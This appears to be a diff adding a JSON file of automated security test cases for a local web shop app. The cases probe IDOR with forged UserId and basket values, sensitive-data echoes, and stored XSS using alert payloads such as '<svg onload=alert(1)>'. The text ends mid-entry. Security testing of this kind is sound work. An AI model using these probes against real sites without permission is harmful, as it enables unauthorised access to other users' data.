@@ -1,0 +1,1789 @@
+{
+  "test_cases": [
+    {
+      "id": "tc_idor_address_read_7",
+      "hypothesis_id": "idor_address_read_7",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "http://localhost:3000/api/Addresss/7",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [],
+          "description": "Baseline authorized read of Address 7 to compare responses",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [],
+          "description": "Repeat read to detect variance and access control behavior",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated user session (JWT or cookie)"
+        },
+        {
+          "type": "session_state",
+          "description": "CSRF not required for GET"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "if status_code in [401,403] then blocked access; else continue checks",
+          "threshold": {
+            "expected_codes": [
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "abs(body_length_delta_pct) >= 30 and status_code == 200",
+          "threshold": {
+            "body_length_delta_pct": 30.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "error_signature",
+          "condition": "status_code in [400,404] indicating denied access",
+          "threshold": {
+            "expected_codes": [
+              400,
+              404
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 5
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "idor",
+        "address",
+        "read"
+      ]
+    },
+    {
+      "id": "tc_idor_address_update_7",
+      "hypothesis_id": "idor_address_update_7",
+      "base_url": "http://localhost:3000",
+      "method": "PUT",
+      "endpoint": "http://localhost:3000/api/Addresss/7",
+      "parameter": "body",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "country",
+              "value": "Indonesia"
+            },
+            {
+              "location": "fullName",
+              "value": "homee"
+            },
+            {
+              "location": "mobileNum",
+              "value": "6277711133"
+            },
+            {
+              "location": "zipCode",
+              "value": "144444"
+            },
+            {
+              "location": "streetAddress",
+              "value": "Jl. Raya No. 1"
+            },
+            {
+              "location": "city",
+              "value": "Bandung"
+            },
+            {
+              "location": "state",
+              "value": "Jawa Barat"
+            }
+          ],
+          "description": "Attempt to update Address 7 as current user to test BAC",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated user session (JWT or cookie)"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "status_code in [401,403] indicates blocked write to foreign resource",
+          "threshold": {
+            "expected_codes": [
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code in [200,204] and abs(body_length_delta_pct) >= 20 implies unauthorized modification",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200,
+              204
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 3
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.3,
+      "tags": [
+        "idor",
+        "address",
+        "update"
+      ]
+    },
+    {
+      "id": "tc_idor_basketitem_read_9",
+      "hypothesis_id": "idor_basketitem_read_9",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "http://localhost:3000/api/BasketItems/9",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [],
+          "description": "Baseline read of BasketItem 9",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated session"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "status_code in [401,403] implies blocked access",
+          "threshold": {
+            "expected_codes": [
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code == 200 and abs(body_length_delta_pct) >= 30 suggests cross-user data",
+          "threshold": {
+            "body_length_delta_pct": 30.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 5
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "idor",
+        "basketitem",
+        "read"
+      ]
+    },
+    {
+      "id": "tc_idor_basketitem_update_9",
+      "hypothesis_id": "idor_basketitem_update_9",
+      "base_url": "http://localhost:3000",
+      "method": "PUT",
+      "endpoint": "http://localhost:3000/api/BasketItems/9",
+      "parameter": "body",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "quantity",
+              "value": "1"
+            }
+          ],
+          "description": "Try to modify quantity on BasketItem 9",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated session"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "status_code in [401,403] indicates blocked update",
+          "threshold": {
+            "expected_codes": [
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code in [200,204] and abs(body_length_delta_pct) >= 20 implies unauthorized modification",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200,
+              204
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 3
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.3,
+      "tags": [
+        "idor",
+        "basketitem",
+        "update"
+      ]
+    },
+    {
+      "id": "tc_idor_basketitem_delete_9",
+      "hypothesis_id": "idor_basketitem_delete_9",
+      "base_url": "http://localhost:3000",
+      "method": "DELETE",
+      "endpoint": "http://localhost:3000/api/BasketItems/9",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [],
+          "description": "Attempt to delete BasketItem 9",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated session"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "status_code in [401,403] indicates blocked deletion",
+          "threshold": {
+            "expected_codes": [
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code in [200,204] and abs(body_length_delta_pct) >= 15 indicates unauthorized deletion",
+          "threshold": {
+            "body_length_delta_pct": 15.0,
+            "expected_codes": [
+              200,
+              204
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 2
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.3,
+      "tags": [
+        "idor",
+        "basketitem",
+        "delete"
+      ]
+    },
+    {
+      "id": "tc_idor_basketitem_create",
+      "hypothesis_id": "idor_basketitem_create",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "http://localhost:3000/api/BasketItems/",
+      "parameter": "body",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "ProductId",
+              "value": "1"
+            },
+            {
+              "location": "BasketId",
+              "value": "6"
+            },
+            {
+              "location": "quantity",
+              "value": "1"
+            }
+          ],
+          "description": "Create BasketItem tied to BasketId 6 (potentially foreign)",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated session"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "status_code in [401,403] indicates blocked create for foreign basket",
+          "threshold": {
+            "expected_codes": [
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code in [200,201] and abs(body_length_delta_pct) >= 20 indicates unauthorized association",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200,
+              201
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 3
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.3,
+      "tags": [
+        "idor",
+        "basketitem",
+        "create"
+      ]
+    },
+    {
+      "id": "tc_sde_cards_read_7",
+      "hypothesis_id": "sde_cards_read_7",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "http://localhost:3000/api/Cards/7",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [],
+          "description": "Read card 7 and compare for sensitive fields exposure",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated user session"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code==200 and abs(body_length_delta_pct) >= 25 indicates potential sensitive fields",
+          "threshold": {
+            "body_length_delta_pct": 25.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "error_signature",
+          "condition": "status_code in [400,403,404] with verbose error",
+          "threshold": {
+            "expected_codes": [
+              400,
+              403,
+              404
+            ]
+          },
+          "weight": 0.5
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 4
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "sde",
+        "cards",
+        "read"
+      ]
+    },
+    {
+      "id": "tc_sde_cards_create",
+      "hypothesis_id": "sde_cards_create",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "http://localhost:3000/api/Cards/",
+      "parameter": "body",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "fullName",
+              "value": "Dummy"
+            },
+            {
+              "location": "cardNum",
+              "value": "1111234455555555"
+            },
+            {
+              "location": "expMonth",
+              "value": "4"
+            },
+            {
+              "location": "expYear",
+              "value": "2080"
+            }
+          ],
+          "description": "Create card and observe if PAN is echoed in response/errors",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated user session"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code in [200,201] and abs(body_length_delta_pct) >= 20 indicates echoed sensitive fields",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200,
+              201
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "error_signature",
+          "condition": "status_code in [400,422] with echoed PAN indicates leak",
+          "threshold": {
+            "expected_codes": [
+              400,
+              422
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 3
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.3,
+      "tags": [
+        "sde",
+        "cards",
+        "create"
+      ]
+    },
+    {
+      "id": "tc_sde_complaints_list",
+      "hypothesis_id": "sde_complaints_list",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "http://localhost:3000/api/Complaints",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [],
+          "description": "List complaints and assess data volume/fields",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated user session"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code==200 and abs(body_length_delta_pct) >= 30 indicates possible overexposure",
+          "threshold": {
+            "body_length_delta_pct": 30.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 5
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "sde",
+        "complaints",
+        "list"
+      ]
+    },
+    {
+      "id": "tc_idor_complaints_create",
+      "hypothesis_id": "idor_complaints_create",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "http://localhost:3000/api/Complaints/",
+      "parameter": "body",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "UserId",
+              "value": "23"
+            },
+            {
+              "location": "message",
+              "value": "cmoplaint"
+            }
+          ],
+          "description": "Forge UserId on complaint create",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated user session"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "status_code in [400,401,403] indicates server rejected forged UserId",
+          "threshold": {
+            "expected_codes": [
+              400,
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 3
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.3,
+      "tags": [
+        "idor",
+        "complaints",
+        "create"
+      ]
+    },
+    {
+      "id": "tc_idor_delivery_read_1",
+      "hypothesis_id": "idor_delivery_read_1",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "http://localhost:3000/api/Deliverys/1",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [],
+          "description": "Read delivery 1 to assess BAC",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated session"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "status_code in [401,403] indicates enforcement",
+          "threshold": {
+            "expected_codes": [
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code==200 and abs(body_length_delta_pct) >= 30 suggests cross-account data",
+          "threshold": {
+            "body_length_delta_pct": 30.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 5
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "idor",
+        "delivery",
+        "read"
+      ]
+    },
+    {
+      "id": "tc_xss_feedbacks_post_variant1",
+      "hypothesis_id": "xss_feedbacks_post_variant1",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "http://localhost:3000/api/Feedbacks/",
+      "parameter": "body",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "UserId",
+              "value": "23"
+            },
+            {
+              "location": "captchaId",
+              "value": "0"
+            },
+            {
+              "location": "captcha",
+              "value": "17"
+            },
+            {
+              "location": "comment",
+              "value": "<svg onload=alert(1)>"
+            },
+            {
+              "location": "rating",
+              "value": "5"
+            }
+          ],
+          "description": "Inject HTML/JS payload into comment (variant 1)",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated session; satisfy captcha as observed"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "subsequent fetch shows unescaped payload in body",
+          "threshold": {
+            "expected_codes": [
+              200,
+              201
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code in [200,201] and abs(body_length_delta_pct) >= 15 suggests stored content",
+          "threshold": {
+            "body_length_delta_pct": 15.0,
+            "expected_codes": [
+              200,
+              201
+            ]
+          },
+          "weight": 0.5
+        },
+        {
+          "signal": "error_signature",
+          "condition": "status_code in [400,422] with template/sanitizer errors",
+          "threshold": {
+            "expected_codes": [
+              400,
+              422
+            ]
+          },
+          "weight": 0.3
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 2
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "tags": [
+        "xss",
+        "feedbacks",
+        "stored"
+      ]
+    },
+    {
+      "id": "tc_xss_feedbacks_post_variant2",
+      "hypothesis_id": "xss_feedbacks_post_variant2",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "http://localhost:3000/api/Feedbacks/",
+      "parameter": "body",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "UserId",
+              "value": "23"
+            },
+            {
+              "location": "captchaId",
+              "value": "1"
+            },
+            {
+              "location": "captcha",
+              "value": "5"
+            },
+            {
+              "location": "comment",
+              "value": "<img src=x onerror=alert(2)>"
+            },
+            {
+              "location": "rating",
+              "value": "1"
+            }
+          ],
+          "description": "Inject image onerror payload into comment (variant 2)",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated session; satisfy captcha as observed"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "subsequent fetch shows unescaped payload in body",
+          "threshold": {
+            "expected_codes": [
+              200,
+              201
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code in [200,201] and abs(body_length_delta_pct) >= 15 suggests stored content",
+          "threshold": {
+            "body_length_delta_pct": 15.0,
+            "expected_codes": [
+              200,
+              201
+            ]
+          },
+          "weight": 0.5
+        },
+        {
+          "signal": "error_signature",
+          "condition": "status_code in [400,422] with template/sanitizer errors",
+          "threshold": {
+            "expected_codes": [
+              400,
+              422
+            ]
+          },
+          "weight": 0.3
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 2
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "tags": [
+        "xss",
+        "feedbacks",
+        "stored"
+      ]
+    },
+    {
+      "id": "tc_idor_recycles_create",
+      "hypothesis_id": "idor_recycles_create",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "http://localhost:3000/api/Recycles/",
+      "parameter": "body",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "UserId",
+              "value": "23"
+            },
+            {
+              "location": "AddressId",
+              "value": "7"
+            },
+            {
+              "location": "quantity",
+              "value": "10"
+            }
+          ],
+          "description": "Forge UserId/AddressId on recycle create",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated session"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "status_code in [400,401,403] indicates rejection of forged identifiers",
+          "threshold": {
+            "expected_codes": [
+              400,
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code in [200,201] and abs(body_length_delta_pct) >= 20 suggests unauthorized linkage",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200,
+              201
+            ]
+          },
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 3
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.3,
+      "tags": [
+        "idor",
+        "recycles",
+        "create"
+      ]
+    },
+    {
+      "id": "tc_sde_product_1_query_d",
+      "hypothesis_id": "sde_product_1_query_d",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "http://localhost:3000/api/Products/1",
+      "parameter": "d",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "d",
+              "value": "Tue Dec 02 2025"
+            }
+          ],
+          "description": "Baseline with observed date",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "d",
+              "value": "Mon Jan 01 1900"
+            }
+          ],
+          "description": "Alter date to check data exposure variance",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code==200 and abs(body_length_delta_pct) >= 15 indicates exposure variance by date",
+          "threshold": {
+            "body_length_delta_pct": 15.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 5
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "sde",
+        "products",
+        "query-param"
+      ]
+    },
+    {
+      "id": "tc_sde_product_24_query_d",
+      "hypothesis_id": "sde_product_24_query_d",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "http://localhost:3000/api/Products/24",
+      "parameter": "d",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "d",
+              "value": "Tue Dec 02 2025"
+            }
+          ],
+          "description": "Baseline with observed date",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "d",
+              "value": "Mon Jan 01 1900"
+            }
+          ],
+          "description": "Alter date to check data exposure variance",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code==200 and abs(body_length_delta_pct) >= 15 indicates exposure variance by date",
+          "threshold": {
+            "body_length_delta_pct": 15.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 5
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "sde",
+        "products",
+        "query-param"
+      ]
+    },
+    {
+      "id": "tc_sde_securityanswers_create",
+      "hypothesis_id": "sde_securityanswers_create",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "http://localhost:3000/api/SecurityAnswers/",
+      "parameter": "body",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "UserId",
+              "value": "23"
+            },
+            {
+              "location": "answer",
+              "value": "harry potter"
+            },
+            {
+              "location": "SecurityQuestionId",
+              "value": "11"
+            }
+          ],
+          "description": "Create security answer and observe echoes/errors",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated session (if required)"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code in [200,201] and abs(body_length_delta_pct) >= 20 indicates echo of sensitive answers",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200,
+              201
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "error_signature",
+          "condition": "status_code in [400,422] with sensitive echo in validation error",
+          "threshold": {
+            "expected_codes": [
+              400,
+              422
+            ]
+          },
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 2
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.3,
+      "tags": [
+        "sde",
+        "securityanswers",
+        "create"
+      ]
+    },
+    {
+      "id": "tc_sde_users_register_echo",
+      "hypothesis_id": "sde_users_register_echo",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "http://localhost:3000/api/Users/",
+      "parameter": "body",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "email",
+              "value": "dummy@mail.com"
+            },
+            {
+              "location": "password",
+              "value": "dummy"
+            },
+            {
+              "location": "passwordRepeat",
+              "value": "dummy"
+            },
+            {
+              "location": "securityQuestion",
+              "value": "{\"id\":11,\"question\":\"Your favorite book?\",\"createdAt\":\"2025-12-02T07:01:52.877Z\",\"updatedAt\":\"2025-12-02T07:01:52.877Z\"}"
+            },
+            {
+              "location": "securityAnswer",
+              "value": "harry potter"
+            }
+          ],
+          "description": "Register user and inspect response/error for secret echo",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code in [200,201,400,422] and abs(body_length_delta_pct) >= 25 indicates echo of secrets",
+          "threshold": {
+            "body_length_delta_pct": 25.0,
+            "expected_codes": [
+              201,
+              200,
+              400,
+              422
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "error_signature",
+          "condition": "status_code in [400,422] with raw credentials/question object in body",
+          "threshold": {
+            "expected_codes": [
+              400,
+              422
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 2
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.3,
+      "tags": [
+        "sde",
+        "users",
+        "register"
+      ]
+    },
+    {
+      "id": "tc_xss_product_review_put",
+      "hypothesis_id": "xss_product_review_put",
+      "base_url": "http://localhost:3000",
+      "method": "PUT",
+      "endpoint": "http://localhost:3000/rest/products/1/reviews",
+      "parameter": "body",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "message",
+              "value": "<b>nice</b><script>alert(3)</script>"
+            },
+            {
+              "location": "author",
+              "value": "dummy@mail.com"
+            }
+          ],
+          "description": "Inject script in product review message",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "subsequent GET of reviews shows unescaped payload content",
+          "threshold": {
+            "expected_codes": [
+              200,
+              201
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code in [200,201] and abs(body_length_delta_pct) >= 15 indicates echo",
+          "threshold": {
+            "body_length_delta_pct": 15.0,
+            "expected_codes": [
+              200,
+              201
+            ]
+          },
+          "weight": 0.5
+        },
+        {
+          "signal": "error_signature",
+          "condition": "status_code in [400,422] with template errors",
+          "threshold": {
+            "expected_codes": [
+              400,
+              422
+            ]
+          },
+          "weight": 0.3
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 2
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "tags": [
+        "xss",
+        "reviews",
+        "stored"
+      ]
+    },
+    {
+      "id": "tc_sde_product_reviews_list",
+      "hypothesis_id": "sde_product_reviews_list",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "http://localhost:3000/rest/products/1/reviews",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [],
+          "description": "List reviews for product 1 and assess fields exposure",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code==200 and abs(body_length_delta_pct) >= 20 indicates excessive data",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 5
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "sde",
+        "reviews",
+        "list"
+      ]
+    },
+    {
+      "id": "tc_idor_rest_basket_6",
+      "hypothesis_id": "idor_rest_basket_6",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "http://localhost:3000/rest/basket/6",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [],
+          "description": "Read basket 6 content to assess BAC",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated session"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "status_code in [401,403] indicates blocked access",
+          "threshold": {
+            "expected_codes": [
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code==200 and abs(body_length_delta_pct) >= 30 indicates foreign basket exposure",
+          "threshold": {
+            "body_length_delta_pct": 30.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 4
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "idor",
+        "basket",
+        "read"
+      ]
+    },
+    {
+      "id": "tc_idor_rest_basket_coupon_get",
+      "hypothesis_id": "idor_rest_basket_coupon_get",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "http://localhost:3000/rest/basket/6/coupon",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [],
+          "description": "Read coupon for basket 6 to assess leakage",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated session"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "status_code in [401,403] indicates coupon access blocked",
+          "threshold": {
+            "expected_codes": [
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code==200 and abs(body_length_delta_pct) >= 25 indicates leakage",
+          "threshold": {
+            "body_length_delta_pct": 25.0,
+            "expected_codes": [
